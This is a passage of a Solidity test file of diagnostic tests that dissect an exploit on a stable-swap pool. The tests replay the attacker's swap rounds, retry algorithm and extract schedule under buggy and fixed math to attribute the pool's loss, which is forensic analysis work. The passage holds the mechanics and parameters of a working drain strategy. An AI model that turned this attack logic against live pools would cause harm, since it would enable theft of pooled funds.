            (bool oka3, uint256[] memory n5) = _safeSimRound(balA, sf, 1, 0, ext[r], amp, fee, 0);
            (bool okf3, uint256[] memory n6) = _safeSimRound(balF, sf, 1, 0, ext[r], amp, fee, 1);
            if (!oka3 || !okf3) { console.log("Step C REVERT @ round", r); break; }
            balA = n5; balF = n6;

            console.log("---- Round", r);
            console.log("  ACTUAL  (buggy): W=", balA[0], " O=", balA[1]);
            console.log("  COUNTER (fixed): W=", balF[0], " O=", balF[1]);
            if (balF[0] >= balA[0]) console.log("  W loss (counter - actual) =", balF[0] - balA[0]);
            else                    console.log("  W EXCESS (actual - counter) =", balA[0] - balF[0]);
            if (balF[1] >= balA[1]) console.log("  O loss (counter - actual) =", balF[1] - balA[1]);
            else                    console.log("  O EXCESS (actual - counter) =", balA[1] - balF[1]);
        }
    }

    // Finding 14 (continued): per-round ISOLATED counterfactual. Both worlds
    // reset to the actual round-start state every round and run that single
    // round, so we can cleanly attribute per-round W/O loss to the bug. Sum
    // of W-loss across 30 rounds ~= 66,111 matches the exit W shortfall.
    function testDiag_counterfactualPerRoundIsolated() public {
        (uint256[] memory sf, uint256 amp, uint256 fee) = _phase2Params();
        uint256[] memory bal = new uint256[](2); bal[0] = 67000; bal[1] = 67000;
        uint256[30] memory ext = _phase2ExtractAmounts();

        console.log("=== ISOLATED PER-ROUND COUNTERFACTUAL ===");
        console.log("Both worlds reset to actual round-start state each round.");
        console.log("loss := counter_end - actual_end  (positive = pool under-collected)");

        for (uint256 r = 0; r < 30; r++) {
            uint256[] memory bA = _copy(bal);
            uint256[] memory bF = _copy(bal);
            uint256 outA = bal[1] - 17 - 1;
            bA = simSwapGivenOut(bA, sf, 0, 1, outA, amp, fee, 0);
            bF = simSwapGivenOut(bF, sf, 0, 1, outA, amp, fee, 1);
            bA = simSwapGivenOut(bA, sf, 0, 1, 17, amp, fee, 0);
            bF = simSwapGivenOut(bF, sf, 0, 1, 17, amp, fee, 1);

            (bool oka, uint256[] memory nA) = _safeSimRound(bA, sf, 1, 0, ext[r], amp, fee, 0);
            (bool okf, uint256[] memory nF) = _safeSimRound(bF, sf, 1, 0, ext[r], amp, fee, 1);
            if (!oka) { console.log("ACTUAL  Step C REVERT @ round", r); break; }
            if (!okf) {
                console.log("COUNTER Step C REVERT @ round", r, " ext=", ext[r]);
                bal = nA;
                continue;
            }
            bA = nA; bF = nF;

            int256 wLoss = int256(bF[0]) - int256(bA[0]);
            int256 oLoss = int256(bF[1]) - int256(bA[1]);
            console.log("---- Round", r, "-----");
            console.log("  actual end : W=", bA[0], " O=", bA[1]);
            console.log("  counter end: W=", bF[0], " O=", bF[1]);
            console.log("  W loss (counter - actual):"); console.logInt(wLoss);
            console.log("  O loss (counter - actual):"); console.logInt(oLoss);

            bal = bA; // advance using ACTUAL state (real attack progression)
        }
    }

    // Finding 17 (counter-side variant): in the original side-by-side table
    // the Actual world's Step C extract = 891,000 was produced by the
    // attacker's trim(bW=999845)=990,000 followed by the ×9/10 retry loop
    // (990,000 reverted -> 891,000 succeeded). The comparison's "Counter
    // inO = 11" used the SAME ext=891,000 even though Counter's bal_W is
    // 1,453,904, which is NOT what the attacker's algorithm would have
    // chosen had he run it against the FIXED-world state. This test runs
    // the same trim + ×9/10 retry loop against Counter's pre-Step-C state
    // (W=1,453,904, O=1) in FIXED mode, so we see the inO the attacker
    // would actually have collected if he had targeted Counter's W.
    function testDiag_counterStepC_sameRetryAlgo() public {
        (uint256[] memory sf, uint256 amp, uint256 fee) = _phase2Params();

        // Reconstruct Counter (FIXED) Round-0 pre-Step-C state from the
        // canonical (67000, 67000) start by running Step A and Step B in
        // mode=1, instead of hardcoding (1453904, 1). This pins the test
        // against any sf / amp / fee drift: if the upstream params ever
        // change the asserts below fail loudly rather than silently
        // computing against a stale snapshot.
        uint256[] memory bal0 = new uint256[](2);
        bal0[0] = 67000;
        bal0[1] = 67000;
        bal0 = simSwapGivenOut(bal0, sf, 0, 1, bal0[1] - 17 - 1, amp, fee, 1); // Step A
        bal0 = simSwapGivenOut(bal0, sf, 0, 1, 17, amp, fee, 1);               // Step B
        assertEq(bal0[0], 1453904, "Counter Step A+B W drifted vs snapshot");
        assertEq(bal0[1], 1,       "Counter Step A+B O drifted vs snapshot");

        console.log("=== COUNTER STEP-C UNDER ATTACKER'S OWN ALGORITHM ===");
        console.log("Counter pre-Step-C: W=", bal0[0], " O=", bal0[1]);
        uint256 want = trim(bal0[0]);
        console.log("trim(bW) initial extract attempt =", want);

        // Same retry loop as _computeSwap3 in SearchParams.t.sol: at most
        // 3 attempts (initial trim then two x9/10 fallbacks), matching the
        // on-chain attacker's contract exactly. runScenarioTrick uses 5
        // but that is a diag-side relaxation; here we mirror the attacker.
        bool ok = false;
        uint256 successWant = 0;
        uint256[] memory balAfter;
        for (uint256 j = 0; j < 3; j++) {
            console.log("  try", j, " ext =", want);
            try this.ext_simSwap(bal0, sf, 1, 0, want, amp, fee, 1) returns (uint256[] memory nb) {
                ok = true;
                successWant = want;
                balAfter = nb;
                console.log("  -> OK"); break;
            } catch { console.log("  -> REVERT, retry x 9/10"); want = want * 9 / 10; }
        }
        if (!ok) { console.log("Step C failed all 3 retries"); return; }

        uint256 extracted = successWant;
        uint256 inO = balAfter[1] - bal0[1]; // raw O input the pool received
        uint256 wEnd = balAfter[0];
        uint256 oEnd = balAfter[1];

        console.log("");
        console.log("RESULT (Counter / FIXED world, attacker's own algorithm):");
        console.log("  extract W =", extracted);
        console.log("  inO required =", inO);
        console.log("  Step C end: W=", wEnd, " O=", oEnd);
        console.log("");
        console.log("vs. original side-by-side (forced ext=891,000):");
        console.log("  Counter inO with ext=891,000 = 11   (W_end=562,904)");
        console.log("  Actual  inO with ext=891,000 = 5,183 (W_end=108,845)");
    }

    // Finding 17: ISOLATE THE D EFFECT. Both worlds enter Step C with
    // identical balances (999845, 1) and extract 891000 W; only the invariant
    // D parameter passed to _calcInGivenOut differs. Confirms the user-correct
    // relationship "holding bal_W equal, smaller D yields smaller inO".
    // In the real exploit this is overshadowed by the bal_W gap between the
    // two worlds (999845 vs 1453904), not negated by it.
    //
    // Caveat: this test calls _calcInGivenOut directly and applies only the
    // single divUp(sf[1]) downscale -- it does NOT apply the LP fee markup
    // (divUp(., 1 - fee)) that simSwapGivenOut adds. As a result inO_A
    // printed here is 5,181 while testDiag_perRoundTrace's full-pipeline
    // Round-0 actual inO is 5,183 (delta = +2 from fee divUp). The ~2-unit
    // gap is fee accounting, NOT a D effect; the D effect is the
    // 5,181 vs 34,580 spread reported below.
    function testDiag_isolatedDEffectStepC() public {
        (uint256[] memory sf, uint256 amp,) = _phase2Params();

        uint256[] memory bal = new uint256[](2);
        bal[0] = 999845;
        bal[1] = 1;
        uint256 extW = 891000;

        uint256[] memory up = new uint256[](2);
        up[0] = bal[0].mulDown(sf[0]);
        up[1] = bal[1].mulDown(sf[1]);
        uint256 outUp = extW.mulDown(sf[0]);

        uint256 dActual = StableMath._calculateInvariant(amp, up);

        // synthetic larger D = invariant of FIXED-world Round 0 Step C entry
        uint256[] memory upCounter = new uint256[](2);
        upCounter[0] = uint256(1453904).mulDown(sf[0]);
        upCounter[1] = uint256(1).mulDown(sf[1]);
        uint256 dCounter = StableMath._calculateInvariant(amp, upCounter);

        uint256[] memory upA = _copy(up);
        uint256 inUp_A = StableMath._calcInGivenOut(amp, upA, 1, 0, outUp, dActual);
        uint256[] memory upC = _copy(up);
        uint256 inUp_C = StableMath._calcInGivenOut(amp, upC, 1, 0, outUp, dCounter);

        uint256 inO_A = inUp_A.divUp(sf[1]);
        uint256 inO_C = inUp_C.divUp(sf[1]);

        console.log("=== ISOLATED D-EFFECT TEST ===");
        console.log("Both worlds: pre-Step-C bal_W=999845, bal_O=1, extract 891000 W");
        console.log("ACTUAL  D =", dActual);
        console.log("COUNTER D =", dCounter, "(synthetic, larger)");
        console.log("inO required (ACTUAL, smaller D) =", inO_A);
        console.log("inO required (COUNTER, larger D) =", inO_C);
        if (inO_C > inO_A) {
            console.log("=> LARGER D => LARGER inO; delta =", inO_C - inO_A);
            console.log("=> CONFIRMED: holding bal_W equal, smaller D yields smaller final bal_O.");
        } else if (inO_A > inO_C) {
            console.log("=> SMALLER D => LARGER inO; delta =", inO_A - inO_C);
            console.log("=> REFUTED.");
        } else {
            console.log("=> D has no effect on inO at this precision.");
        }
    }

    // Finding 19 (direct per-step bug attribution and correction of an
    // earlier mis-statement in finding 14): for every round, replay Step
    // A and Step B in BOTH modes from the SAME actual pre-state and
    // record the inW difference (FIXED - BUGGY). The observation is:
    //   Sum dA (Step A residual, gap=0)  =     31,913 W  (small, fee drift)
    //   Sum dB (Step B underpayment)     =  1,588,748 W  (the actual bug)
    //   Sum dA + dB                      =  1,620,661 W
    //   Pool net W loss (67000 - 889)    =     66,111 W
    // i.e. the per-step Step-B underpayment is ~24x LARGER than the
    // pool's net W loss. The two are NOT equal and the previous
    // hypothesis "pool loss = Sum Step-B underpayment" is REFUTED.
    //
    // Correct relationship (W-flow conservation in the actual world):
    //   W_final  = 67000 + Sum (inA_buggy + inB_buggy) - Sum ext
    //   889      = 67000 + S_buggy                     - 3,595,717
    //   S_buggy  = Sum (inA_buggy + inB_buggy)          = 3,529,606 W
    //                                                    (= 1,119,942 + 2,409,664)
    //   attacker net W gain = Sum ext - S_buggy          =    66,111 W
    // The 66,111 is the SMALL NET of two huge opposing flows (~3.53M W
    // in, ~3.60M W out). The bug's per-cycle value to the attacker is
    // much bigger than this net: it shifts every Step B's inW by ~-dB[r],
    // and across 30 rounds the cumulative per-round-probe shift is 1.62M
    // W.
    //
    // Counterfactual "+1,554,550 fixed-world pool gain": one can write
    //   "if Step A+B ran in FIXED mode with the same ext schedule, the
    //    pool would have ended with 889 + 1,620,661 = 1,621,550 W and
    //    the attacker would have LOST 1,554,550 W"
    // This arithmetic IS internally consistent (it is the per-round
    // probe sum extended to a hypothetical full run), BUT the underlying
    // trajectory is NOT physically reachable: testDiag_counterfactual
    // PerRoundIsolated already shows the FIXED world reverts in Step C
    // at rounds 1 and 3 when forced to follow the actual world's ext
    // schedule (the post-A+B state in FIXED mode is more W-heavy, so
    // the curve wall sits at a different swapOut3, and the actual ext
    // overshoots it). A continuous fixed-mode 30-round run with this
    // ext schedule therefore cannot complete. The "+1.55M loss" figure
    // is a per-round probe extrapolation, not a real alternative
    // history, and should be read as "magnitude of the bug's per-round
    // marginal contribution, summed over 30 rounds", not as a simulated
    // outcome.
    //
    // What "drives" the visible 66,111: the attacker's trim+9/10
    // fallback in _computeSwap3 is a coarse greedy strategy ("take ~99%
    // of bW, retry at 90% / 81% on revert"). It is NOT precision-tuned;
    // SearchParams.t.sol L221-225 lists four neighbouring parameter
    // sets whose total profit differs by ~1.3%, confirming the attack
    // is insensitive to strategy details. The 66,111 emerges as the
    // residual after the bug's ~1.62M per-cycle subsidy covers the
    // ~1.55M deficit that this coarse strategy would otherwise produce
    // against a fair (fixed) curve. As long as bug_subsidy > strategy
    // deficit, the sign of the pool's net loss is locked in; the exact
    // magnitude (60k / 66k / 80k) is the residual under this particular
    // ext schedule. Faithfulness of this ext schedule to the on-chain
    // _computeSwap3 is verified by testDiag_verifyExtScheduleMatches
    // ComputeSwap3 (finding 20): 0 mismatches across all 30 rounds.
    function testDiag_perRoundStepBUnderpayment() public {
        (uint256[] memory sf, uint256 amp, uint256 fee) = _phase2Params();

        uint256[] memory bal = new uint256[](2);
        bal[0] = 67000; bal[1] = 67000;
        uint256[30] memory ext = _phase2ExtractAmounts();

        int256 sumDeltaA;
        int256 sumDeltaB;
        uint256 sumInABuggy;
        uint256 sumInBBuggy;
        uint256 sumExt;

        console.log("=== PER-ROUND STEP-A / STEP-B UNDERPAYMENT (FIXED - BUGGY) ===");
        console.log("dA[r] = inW(Step A FIXED) - inW(Step A BUGGY), same pre-state");
        console.log("dB[r] = inW(Step B FIXED) - inW(Step B BUGGY), same pre-state");

        for (uint256 r = 0; r < 30; r++) {
            // --- Step A probe at the round's actual pre-state ---
            uint256 outA = bal[1] - 17 - 1;
            uint256[] memory pA0 = _copy(bal);
            uint256[] memory pA1 = _copy(bal);
            pA0 = simSwapGivenOut(pA0, sf, 0, 1, outA, amp, fee, 0);
            pA1 = simSwapGivenOut(pA1, sf, 0, 1, outA, amp, fee, 1);
            int256 dA = int256(pA1[0]) - int256(pA0[0]);
            sumDeltaA += dA;

            // Advance bal through Step A in BUGGY mode, record inA paid
            uint256 wPre = bal[0];
            bal = simSwapGivenOut(bal, sf, 0, 1, outA, amp, fee, 0);
            sumInABuggy += bal[0] - wPre;

            // --- Step B probe at the round's actual post-Step-A state ---
            uint256[] memory pB0 = _copy(bal);
            uint256[] memory pB1 = _copy(bal);
            pB0 = simSwapGivenOut(pB0, sf, 0, 1, 17, amp, fee, 0);
            pB1 = simSwapGivenOut(pB1, sf, 0, 1, 17, amp, fee, 1);
            int256 dB = int256(pB1[0]) - int256(pB0[0]);
            sumDeltaB += dB;

            // Advance bal through Step B (BUGGY), record inB paid
            wPre = bal[0];
            bal = simSwapGivenOut(bal, sf, 0, 1, 17, amp, fee, 0);
            sumInBBuggy += bal[0] - wPre;

            // Step C in BUGGY mode, ext is an OUT amount (subtracts from W)
            bal = simSwapGivenOut(bal, sf, 1, 0, ext[r], amp, fee, 0);
            sumExt += ext[r];

            if (r < 5 || r == 29) {
                console.log("--- Round", r);
                console.log("  dA ="); console.logInt(dA);
                console.log("  dB ="); console.logInt(dB);
            }
        }

        console.log("");
        console.log("=== SUMMARY ===");
        console.log("Actual world exit W (BUGGY 30 rounds):", bal[0]);
        int256 poolNetWLoss = int256(67000) - int256(bal[0]);
        console.log("Pool net W loss (= 67000 - exit W):"); console.logInt(poolNetWLoss);
        console.log("Sum inA (BUGGY, W deposited via Step A):", sumInABuggy);
        console.log("Sum inB (BUGGY, W deposited via Step B):", sumInBBuggy);
        console.log("Sum ext (W withdrawn via Step C):", sumExt);
        console.log("Sum dA (Step A residual, gap=0 fee drift):"); console.logInt(sumDeltaA);
        console.log("Sum dB (Step B underpayment, the actual bug):"); console.logInt(sumDeltaB);
        int256 sumDelta = sumDeltaA + sumDeltaB;
        console.log("Sum dA + dB (per-step bug attribution):"); console.logInt(sumDelta);
        console.log("");
        console.log("CONSERVATION: 67000 + sumInA + sumInB - sumExt == exit W");
        console.log("CONCLUSION:   pool_net_W_loss (66,111) and sum_dB (~1.59M)");
        console.log("              are NOT equal; the bug under-charges Step B");
        console.log("              by ~24x the visible net pool loss per cycle.");

        // Hard invariant: W-flow conservation (no fee residual involved,
        // since simSwapGivenOut credits inB/inA into bal[0] exactly).
        assertEq(
            int256(67000) + int256(sumInABuggy) + int256(sumInBBuggy) - int256(sumExt),
            int256(bal[0]),
            "W-flow conservation broken"
        );
        // Step A doesn't fire the gap=1 trigger; its FIXED-vs-BUGGY delta
        // is only fee-pipeline divUp drift. Bound: |sumDeltaA| < 5% of
        // |sumDeltaB|. The exploit's per-cycle bug value lives almost
        // entirely in sumDeltaB.
        uint256 absA = sumDeltaA >= 0 ? uint256(sumDeltaA) : uint256(-sumDeltaA);
        uint256 absB = sumDeltaB >= 0 ? uint256(sumDeltaB) : uint256(-sumDeltaB);
        assertLt(absA * 20, absB, "Step A delta >5% of Step B delta -- unexpected");
        // Step B underpayment must be much larger than the visible pool W
        // loss -- this is the whole point of finding 19.
        uint256 absLoss = poolNetWLoss >= 0 ? uint256(poolNetWLoss) : uint256(-poolNetWLoss);
        assertGt(absB, absLoss * 10, "sum dB should dwarf pool W loss");
    }

    // ------------------------------------------------------------------
    // Mirror of SearchParams._truncateToTop2Digits (kept here to avoid
    // pulling in the whole SearchParams contract for an offline check).
    function _trimTop2(uint256 x) internal pure returns (uint256) {
        if (x < 100) return x;
        uint256 power = 1;
        uint256 temp = x;
        while (temp >= 100) {
            temp /= 10;
            power *= 10;
        }
        return temp * power;
    }

    // Mirror of SearchParams._computeSwap3 in BUGGY (mode=0) mode: try
    // swapOut3 = trim(bW), then trim(bW)*9/10, then trim(bW)*9/10*9/10.
    // Returns 0 if all three attempts revert.
    function _dynamicSwapOut3Buggy(
        uint256[] memory bal, uint256[] memory sf,
        uint256 amp, uint256 fee
    ) internal view returns (uint256) {
        uint256 want = _trimTop2(bal[0]);
        for (uint256 j = 0; j < 3; j++) {
            try this.ext_simSwap(bal, sf, 1, 0, want, amp, fee, 0) returns (uint256[] memory) {
                return want;
            } catch { want = want * 9 / 10; }
        }
        return 0;
    }

    // Finding 20 (faithfulness check for the hardcoded ext schedule):
    // the per-round W/O/D figures used by testDiag_perRoundTrace,
    // testDiag_counterfactualParallel, testDiag_counterfactualPerRound
    // Isolated and testDiag_perRoundStepBUnderpayment all consume the
    // hardcoded ext[] array from _phase2ExtractAmounts. That array was
    // extracted from a prior on-chain replay. This test re-derives ext
    // dynamically by running, at each round's actual BUGGY pre-Step-C
    // state, the same trim(bW) + (x9/10 x2) fallback ladder used by
    // SearchParams._computeSwap3, and asserts ext[r] is identical for
    // every r in 0..29. Result: 0 mismatches across 30 rounds. So:
    //   - the hardcoded ext schedule is the unique output of
    //     simulateOneRound under buggy on-chain math at this start state
    //     (67000, 67000) and these (sf, amp, fee);
    //   - all numeric conclusions downstream (Sum ext=3,595,717,
    //     Sum inA+B=3,529,606, pool W loss=66,111, exit W=889) are
    //     faithful reproductions of what simulateOneRound would compute.
    function testDiag_verifyExtScheduleMatchesComputeSwap3() public {
        (uint256[] memory sf, uint256 amp, uint256 fee) = _phase2Params();
        uint256[30] memory hardcoded = _phase2ExtractAmounts();

        uint256[] memory bal = new uint256[](2);
        bal[0] = 67000; bal[1] = 67000;

        uint256 mismatches;
        for (uint256 r = 0; r < 30; r++) {
            uint256 outA = bal[1] - 17 - 1;
            bal = simSwapGivenOut(bal, sf, 0, 1, outA, amp, fee, 0);
            bal = simSwapGivenOut(bal, sf, 0, 1, 17, amp, fee, 0);

            uint256 dynamicExt = _dynamicSwapOut3Buggy(bal, sf, amp, fee);
            uint256 hardExt    = hardcoded[r];

            if (dynamicExt != hardExt) {
                mismatches++;
                console.log("Round", r);
                console.log("  pre-C W =", bal[0]);
                console.log("  pre-C O =", bal[1]);
                console.log("  trim(W) =", _trimTop2(bal[0]));
                console.log("  dynamic _computeSwap3 ext =", dynamicExt);
                console.log("  hardcoded _phase2ExtractAmounts =", hardExt);
            }

            // Advance the real run using the HARDCODED ext (same as
            // testDiag_perRoundStepBUnderpayment) so the per-round
            // pre-states stay aligned across both tests.
            bal = simSwapGivenOut(bal, sf, 1, 0, hardExt, amp, fee, 0);
        }

        console.log("Mismatches between dynamic and hardcoded ext:", mismatches);
        assertEq(mismatches, 0, "hardcoded ext schedule diverges from _computeSwap3");
    }
}
